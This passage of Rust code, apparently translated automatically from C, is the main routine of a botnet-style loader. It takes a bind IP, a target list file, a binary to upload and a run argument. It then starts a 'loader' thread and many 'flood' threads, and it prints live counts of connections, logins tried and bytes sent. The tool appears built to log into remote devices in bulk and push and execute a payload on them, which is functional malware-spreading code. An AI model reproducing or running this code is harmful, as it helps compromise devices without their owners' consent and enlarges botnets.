        slice += 1;
        if !(got > 0 as libc::c_int) {
            break;
        }
    }
    close(fd);
    return 0 as libc::c_int;
}
unsafe fn main_0(
    mut argc: libc::c_int,
    mut argv: *mut *mut libc::c_char,
) -> libc::c_int {
    let mut threads: libc::c_int = 0;
    let mut tmp: libc::c_int = 0;
    let mut i: libc::c_int = 0;
    let mut thread: pthread_t = 0;
    let mut timeText: [libc::c_char; 100] = [0; 100];
    let mut now: time_t = 0;
    let mut tmp___0: time_t = 0;
    let mut t: *mut tm = 0 as *mut tm;
    let mut tmp___1: *mut tm = 0 as *mut tm;
    let mut temp: [libc::c_char; 17] = [0; 17];
    let mut tmp___2: libc::c_uint = 0;
    let mut new: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut tmp___3: *mut libc::c_void = 0 as *mut libc::c_void;
    let mut tmp___4: libc::c_int = 0;
    let mut tmp___5: libc::c_int = 0;
    if argc < 4 as libc::c_int {
        fprintf(stderr, b"Invalid parameters!\n\0" as *const u8 as *const libc::c_char);
        fprintf(
            stdout,
            b"Usage: %s <bind ip> <input file> <file_to_load> <argument> <threads> <connections> (debug mode)\n\0"
                as *const u8 as *const libc::c_char,
            *argv.offset(0 as libc::c_int as isize),
        );
        exit(-(1 as libc::c_int));
    }
    signal(
        13 as libc::c_int,
        ::std::mem::transmute::<
            libc::intptr_t,
            Option::<unsafe extern "C" fn(libc::c_int) -> ()>,
        >(1 as libc::c_int as libc::intptr_t),
    );
    epollFD = epoll_create(57005 as libc::c_int);
    bind_ip = *argv.offset(1 as libc::c_int as isize);
    infd = fopen(
        *argv.offset(2 as libc::c_int as isize) as *const libc::c_char,
        b"r\0" as *const u8 as *const libc::c_char,
    );
    signal(
        2 as libc::c_int,
        Some(sighandler as unsafe extern "C" fn(libc::c_int) -> ()),
    );
    tmp = atoi(*argv.offset(5 as libc::c_int as isize) as *const libc::c_char);
    threads = tmp;
    maxConnectedSockets = atoi(
        *argv.offset(6 as libc::c_int as isize) as *const libc::c_char,
    );
    if argc == 8 as libc::c_int {
        debug_mode = 1 as libc::c_int as libc::c_uchar;
    }
    i = 0 as libc::c_int;
    while i < 1 as libc::c_int {
        pthread_mutex_init(
            &mut (*stateTable.as_mut_ptr().offset(i as isize)).mutex,
            0 as *mut libc::c_void as *const pthread_mutexattr_t,
        );
        i += 1;
    }
    load_binary(*argv.offset(3 as libc::c_int as isize));
    run_arg = *argv.offset(4 as libc::c_int as isize);
    pthread_create(
        &mut thread as *mut pthread_t,
        0 as *mut libc::c_void as *const pthread_attr_t,
        Some(loader as unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void),
        &mut threads as *mut libc::c_int as *mut libc::c_void,
    );
    i = 0 as libc::c_int;
    while i < threads {
        pthread_create(
            &mut thread as *mut pthread_t,
            0 as *mut libc::c_void as *const pthread_attr_t,
            Some(flood as unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void),
            0 as *mut libc::c_void,
        );
        i += 1;
    }
    tmp___0 = time(0 as *mut libc::c_void as *mut time_t);
    now = tmp___0;
    tmp___1 = localtime(&mut now as *mut time_t as *const time_t);
    t = tmp___1;
    strftime(
        timeText.as_mut_ptr(),
        (::std::mem::size_of::<[libc::c_char; 100]>() as libc::c_ulong)
            .wrapping_sub(1 as libc::c_ulong),
        b"%d %b %Y %l:%M %p %Z\0" as *const u8 as *const libc::c_char,
        t as *const tm,
    );
    printf(
        b"Starting Scan at %s\n\0" as *const u8 as *const libc::c_char,
        timeText.as_mut_ptr(),
    );
    temp[0 as libc::c_int as usize] = 0 as libc::c_int as libc::c_char;
    tmp___2 = 1 as libc::c_uint;
    while !(tmp___2 >= 17 as libc::c_uint) {
        temp[tmp___2 as usize] = 0 as libc::c_int as libc::c_char;
        tmp___2 = tmp___2.wrapping_add(1);
    }
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"Loaded\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"State Timeout\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"No Connect\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"Closed Us\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"Logins Tried\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"B/s\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"Connected\0" as *const u8 as *const libc::c_char);
    printf(b"%-16s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    memset(
        temp.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        17 as libc::c_int as size_t,
    );
    sprintf(temp.as_mut_ptr(), b"Running Thrds\0" as *const u8 as *const libc::c_char);
    printf(b"%s\0" as *const u8 as *const libc::c_char, temp.as_mut_ptr());
    printf(b"\n\0" as *const u8 as *const libc::c_char);
    sleep(1 as libc::c_uint);
    tmp___3 = malloc(96 as libc::c_int as size_t);
    new = tmp___3 as *mut libc::c_char;
    loop {
        if debug_mode != 0 {
            tmp___5 = 1 as libc::c_int;
        } else {
            tmp___5 = (running_threads > 0 as libc::c_int) as libc::c_int;
        }
        if tmp___5 == 0 {
            break;
        }
        printf(b"\r\0" as *const u8 as *const libc::c_char);
        memset(new as *mut libc::c_void, '\u{0}' as i32, 96 as libc::c_int as size_t);
        sprintf(
            new,
            b"%s|%-15lu\0" as *const u8 as *const libc::c_char,
            new,
            found_srvs,
        );
        sprintf(new, b"%s|%-15lu\0" as *const u8 as *const libc::c_char, new, timed_out);
        sprintf(
            new,
            b"%s|%-15lu\0" as *const u8 as *const libc::c_char,
            new,
            failed_connect,
        );
        sprintf(
            new,
            b"%s|%-15lu\0" as *const u8 as *const libc::c_char,
            new,
            remote_hangup,
        );
        sprintf(
            new,
            b"%s|%-15lu\0" as *const u8 as *const libc::c_char,
            new,
            login_done,
        );
        sprintf(new, b"%s|%-15d\0" as *const u8 as *const libc::c_char, new, bytes_sent);
        tmp___4 = getConnectedSockets();
        sprintf(new, b"%s|%-15lu\0" as *const u8 as *const libc::c_char, new, tmp___4);
        sprintf(
            new,
            b"%s|%-15d\0" as *const u8 as *const libc::c_char,
            new,
            running_threads,
        );
        printf(b"%s\0" as *const u8 as *const libc::c_char, new);
        fflush(stdout);
        bytes_sent = 0 as libc::c_int as libc::c_uint;
        sleep(1 as libc::c_uint);
    }
    printf(b"\n\0" as *const u8 as *const libc::c_char);
    now = time(0 as *mut libc::c_void as *mut time_t);
    t = localtime(&mut now as *mut time_t as *const time_t);
    strftime(
        timeText.as_mut_ptr(),
        (::std::mem::size_of::<[libc::c_char; 100]>() as libc::c_ulong)
            .wrapping_sub(1 as libc::c_ulong),
        b"%d %b %Y %l:%M %p %Z\0" as *const u8 as *const libc::c_char,
        t as *const tm,
    );
    printf(
        b"Scan finished at %s\n\0" as *const u8 as *const libc::c_char,
        timeText.as_mut_ptr(),
    );
    return 0 as libc::c_int;
}
pub fn main() {
    let mut args: Vec::<*mut libc::c_char> = Vec::new();
    for arg in ::std::env::args() {
        args.push(
            (::std::ffi::CString::new(arg))
                .expect("Failed to convert argument into CString.")
                .into_raw(),
        );
    }
    args.push(::std::ptr::null_mut());
    unsafe {
        ::std::process::exit(
            main_0(
                (args.len() - 1) as libc::c_int,
                args.as_mut_ptr() as *mut *mut libc::c_char,
            ) as i32,
        )
    }
}
